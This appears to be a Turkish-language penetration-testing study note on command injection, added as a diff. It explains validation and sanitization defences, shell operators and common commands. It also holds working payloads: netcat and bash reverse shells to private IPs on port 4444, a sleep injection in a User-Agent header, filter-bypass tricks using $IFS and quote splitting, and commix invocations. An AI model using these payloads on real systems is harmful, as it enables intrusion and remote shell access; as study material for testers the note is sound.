@@ -1,0 +1,107 @@
+Input Validation: Kullanıcı girişlerinin doğrulanması sürecidir. Bu, alınan girişlerin beklenen format ve kriterlere uygun olduğunu kontrol etmek için kullanılır. Command Injection zafiyetini önlemek için giriş doğrulaması önemlidir.
+
+Blacklisting: Giriş doğrulamasında kullanılan bir yaklaşımdır. Belirli zararlı karakterlerin veya komutların engellenmesiyle Command Injection gibi saldırıları engellemeyi amaçlar. Ancak, bu yöntem tamamen güvenilir değildir.
+
+Whitelisting: Giriş doğrulamasında kullanılan bir başka yaklaşımdır. İzin verilen karakterlerin veya giriş biçimlerinin belirli bir listeyle sınırlanmasıdır. Bu, Command Injection gibi saldırıları önlemeye yardımcı olabilir
+
+Code Injection: Command Injection'a benzer bir saldırı türüdür. Ancak, Code Injection genellikle programlama dillerinde veya kod içinde gerçekleşirken, Command Injection genellikle sistem komutları üzerinde gerçekleşir.
+
+Sandboxing: Uygulamaların veya işlemlerin, belirli bir izole ortamda çalıştırılmasıdır. Bu, kötü amaçlı kodun diğer sistem bileşenlerine zarar vermesini önlemeye yardımcı olabilir.
+
+Input Sanitization: Kullanıcı girişlerinin temizlenmesi veya filtrelenmesi sürecidir. Bu, zararlı karakterlerin veya komutların girişlerden kaldırılması veya etkisiz hale getirilmesi için kullanılır. Command Injection saldırılarını önlemek için kullanışlı bir yöntemdir.
+
+
+
+Linux'ta Sık Kullanılan Komutlar
+whoami,hostname,ifconfig,ping,id,uname,ls,pwd,cd,cat,touch,rm,grep,find,wget,curl,echo,chmod,chown,sleep
+
+Windows'ta Sık Kullanılan Komutlar
+
+whoami,hostname,ipconfig,ping,net user, systeminfo,dir,cd , type,echo,copy,del,findstr,pwershell,timeout
+
+
+Shell Operatörleri
+
+|      	Bir komutun çıktısını diğer komutun girdisi olarak kullanır.
+
+
+>	Bir komutun çıktısını belirli bir dosyaya yazar
+
+>>	Bir komutun çıktısını dosyanın sonuna ekler.
+
+<	Bir komutun girdisini bir dosyadan alır.
+
+;	Komutları sıralı olarak çalıştırır, bağımsız komutlar arasındaki sınırı belirtir.
+
+&&	İlk komut başarılı olursa, ikinci komut çalışır.
+
+||	İlk komut başarısız olursa, ikinci komut çalışır.
+
+Background Execution (&)	Komutu arka planda çalıştırır.  }sleep 5 & - sleep komutu beş saniye boyunca arka planda çalışır.
+
+
+$()	Alt komutun çıktısını ana komutta argüman olarak kullanır.  echo $(date) - date komutunun çıktısını echo ile ekrana basar.
+
+
+` `	Aynı şekilde alt komutun çıktısını argüman olarak kullanır.	files=`ls` - `ls` çıktısını files değişkenine atar.
+
+
+()	Komutları yeni bir subshell'de yürütür.	<b>Linux:</b> (ls) - Dosyaları listeler.
+
+
+{}	Komutları mevcut Shell'de çalıştırır.	<b>Linux:</b> { ls } - Dosyaları listeler.
+
+Escape Characters (\)	Özel karakterlerin özel işlevini ortadan kaldırır ve bunları doğrudan kullanır.	<b>Linux:</b> echo \"Special text\" - Çift tırnakları ekrana yazdırır
+
+
+
+----------------------------------------------------------------
+
+escapeshellarg()
+
+User-Agent: '; sleep 10'
+
+
+google.com ; nc -e /bin/sh 192.168.1.10 4444
+
+; bash -c 'bash -i >& /dev/tcp/172.20.1.145/4444 0>&1'
+
+www.revshells.com
+
+
+
+----------------------------------------------------------------
+(Bypass) Teknikleri
+
+Whitespace 
+
+Normal Komut: ls /etc/passwd
+Filtrelenmiş Komut: ls/etc/passwd
+Bypass Yöntemi: $IFS kullanarak  ls${IFS}/etc/passwd
+
+Tek ve Çift Tırnak Kullanımı
+
+w'h'o'am'i
+wh``oami
+w"h"o"am"i
+
+$() ve Backticks Kullanımı
+
+who$()ami
+
+who`echo am`i
+----------------------------------------------------------------
+Commix (Command Injection Exploiter), web uygulamalarındaki Command Injection zafiyetlerini tespit edip istismar etmeye yarayan otomatik bir araçtır. Güvenlik araştırmacıları ve sızma testi uzmanları için oldukça faydalıdır.
+
+git clone https://github.com/commixproject/commix.git commix,cd commix,python commix.py
+
+python commix.py <params> 
+
+--url="http://example.com/index.php"
+
+--data="command=test"
+
+--method=POST
+
+python commix.py --url="http://dnslookup.hv/" --data="query=slema" --method=POST
+
